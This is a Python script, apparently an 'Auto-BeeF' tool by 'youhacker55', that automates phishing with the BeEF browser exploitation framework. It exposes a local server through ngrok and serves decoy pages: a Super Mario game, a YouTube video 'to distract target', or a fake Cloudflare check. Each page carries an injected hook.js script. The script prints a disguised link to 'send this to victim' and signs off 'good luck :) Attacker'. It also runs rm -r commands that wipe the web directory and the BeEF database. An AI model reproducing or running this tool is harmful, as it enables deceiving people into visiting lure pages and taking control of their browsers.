import requests
import os
import sys
import time
import signal

def Deletezombie():
    delete = input(Red+ "are you sure you want to delete your zombies:")
    if delete == 'yes':
        if os.path.exists('/usr/share/beef-xss/db/beef.db') == True:
            print(Green + "Found Beef Database")
            os.system('rm -r /usr/share/beef-xss/db/beef.db')
            print(Green+"Database Deleted")

        else:
            print(Red + "Can t find databes")
    else:
        sys.exit()

def cloudflare():

    cloudflare = input(Green+"Do you want to use fake CloudFlare protection:")
    if cloudflare == 'yes':
        os.system("sudo cp -r cloudflare/cloudflare.html /var/www/html")
        os.system('cd /var/www/html && mv index.html page.html')
        os.system('cd /var/www/html && mv cloudflare.html index.html')
    else:
        pass


def ytbvid():
    changeid = input("entre the Video ID to Display to target:")
    os.system('sudo cp -r yt-watch/index.html /var/www/html')
    inplace_change('/var/www/html/index.html', 'beefip', x)
    inplace_change('/var/www/html/index.html', 'DistractVic', changeid)
    cloudflare()
    startbeef()
    inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
    inplace_change('/var/www/html/beef.js', 'youhacker2', z)
    print(Green + "this url for beef Panel: http://" + z + "/ui/panel")
    print(Green + "getting phsihing link")
    time.sleep(5)
    print(Green + "sendthis to victim: http://" + x)
    spoofurl()
    print(Green + "good luck :) Attacker")
    print(Red + "type CRTL + C if you want to exit")
    signal.pause()


def spoofurl():
    shorter = input("do you want to obfuscate the url:")
    if shorter == "yes":
        url = 'https://www.shorturl.at/shortener.php'
        dataget = {"u": "http://" + x, "Shorten URL": "submit"}
        rep = requests.post(url, data=dataget)
        shortenurl = rep.text[10350:10367]
        short = "https://googleweblight.com/i?u=" + shortenurl
        print(Green + "obfuscatedurl=" + short)
    else:
        pass
def Default():
    inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
    inplace_change('/var/www/html/beef.js', 'youhacker2', z)
    with open('/var/www/html/index.html', 'w') as index:
        index.write('<script src="http://' + x + '/beef.js"></script>')
        index.write('\n <p>add your own phishing page</p>')
        index.close()
    startbeef()
    print(Green + "this url for beef Panel: http://" + z + "/ui/panel")
    print(Green + "getting phsihing link")
    time.sleep(5)
    print(Green + "sendthis to victim: http://" + x)



def finish():
    remove = input("do you want to remove the files on the apache dir:")
    if remove == 'yes':
        print(Green + "[+]" + "removing files")
        os.system('rm -r /var/www/html/*')
    else:
        exit()
Red ="\u001b[31m"
Green ="\u001b[32m"
if os.getuid() == 0:
    pass
else:
    print(Red+"Need Root permission")
    sys.exit()
def banner():
    os.system("clear")
    print(Green+"""   _____          __                  __________             ___________                
  /  _  \  __ ___/  |_  ____          \______   \ ____   ____\_   _____/                
 /  /_\  \|  |  \   __\/  _ \   ______ |    |  _// __ \_/ __ \|    __)                  
/    |    \  |  /|  | (  <_> ) /_____/ |    |   \  ___/\  ___/|     \                   
\____|__  /____/ |__|  \____/          |______  /\___  >\___  >___  /                   
        \/                                    \/     \/     \/    \/                    
 __________                                                   ___________               
 \______   \_______  ______  _  ________ ___________          \_   _____/__  _________  
  |    |  _/\_  __ \/  _ \ \/ \/ /  ___// __ \_  __ \  ______  |    __)_\  \/  /\____ \ 
  |    |   \ |  | \(  <_> )     /\___ \\  ___/|  | \/ /_____/  |        \>    < |  |_> >
  |______  / |__|   \____/ \/\_//____  >\___  >__|            /_______  /__/\_ \|   __/ 
         \/                          \/     \/                        \/      \/|__|    

""")
    print(Red+"Coded by youhacker55\n")
banner()

def movehook():
    os.system("sudo cp beef.js /var/www/html")
movehook()


def inplace_change(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print(Red+'"{old_string}" not found in {filename}.'.format(**locals()))
            return

    with open(filename, 'w') as f:
        print(Green+'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()))
        s = s.replace(old_string, new_string)
        f.write(s)


def signal_handler(sig, frame):
    print("Crtl + C detected Stopping Beef")
    os.system('sudo beef-xss-stop')
    finish()
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def apache2():
    print(Green+"[+]"+"starting apache2 server")
    time.sleep(2)
    os.system("sudo service apache2 start")
apache2()
def checkngrokparam(ngrokpath, targettouse):
    with open(ngrokpath, 'r') as read_obj:
        for line in read_obj:
            if targettouse in line:
                return True
    return False


def auth():
    auth = input(Red+'entre ngrok authtoken:')
    os.system("ngrok authtoken " + auth)

if os.system("which ngrok >/dev/null 2>&1") == 0:
    pass
else:
    if os.system("which pip3 >/dev/null 2>&1") != 0:
        os.system("sudo apt-get install python3-pip beef-xss")
        os.system("pip3 install pyngrok")
        print(Green+"[+]""Everything installed good to go")

if os.path.exists('/root/.ngrok2/ngrok.yml') == False:
    auth()
else:
    pass



with open('/root/.ngrok2/ngrok.yml','r') as ngrok:

    while '{}' in ngrok.read():
        print(Red+"[-]""ngrok autotoken not detected")
        auth()
    else:
        pass
    g = """
tunnels:
                       first-app:
                        addr: 80
                        proto: http
                       second-app:
                        addr: 3000
                        proto: http
                        """
    if checkngrokparam('/root/.ngrok2/ngrok.yml', '#capture'):

        pass
    else:
        print(Green+'[+]'+"configuring Ngrok")
        with open('/root/.ngrok2/ngrok.yml','a') as ngrok3:
            ngrok3.write('#capture')
            ngrok3.write(g)
            ngrok3.close()



def startbeef():
    os.system('beef-xss')

try:
    url = "http://127.0.0.1:4040/api/tunnels/first-app"
    recived = requests.get(url)
    http = recived.json()["public_url"]
    url2 = 'http://127.0.0.1:4040/api/tunnels/second-app'
    recived2 = requests.get(url2)
    http2 = recived2.json()["public_url"]
    x = http[8:]
    z = http2[8:]
    print(Red + """ 
    Availble WebPages
    1) SuperMario (will Add more maybe)
    2) Use WebPage that you can Put YT Vid on it to distract target
    3) just start beef for me and forward ports
    d) Delete all beef Zombies

    """)
    b = input(Green+'Choose:')
    if b == "1":
        startbeef()
        os.system('sudo cp -r Super-Mario/* /var/www/html')
        inplace_change('/var/www/html/index.html', 'youhacker', x)
        inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
        inplace_change('/var/www/html/beef.js', 'youhacker2', z)
        cloudflare()
        print(Green + "this url for beef Panel: http://" + z + "/ui/panel")
        print(Green + "getting phsihing link")
        time.sleep(5)
        print(Green + "sendthis to victim: http://" + x)
        spoofurl()
        print(Green + "good luck :) Attacker")
        print(Red + "type CRTL + C if you want to exit")
        signal.pause()
    elif b == "2":
        ytbvid()
    elif b == 'd':
        Deletezombie()


    else:
        Default()
        spoofurl()
        print(Green + "good luck :) Attacker")
        print(Red + "type CRTL + C if you want to exit")
        signal.pause()





except requests.ConnectionError:
    print("start ngrok just type:sudo ngrok  start -all ")

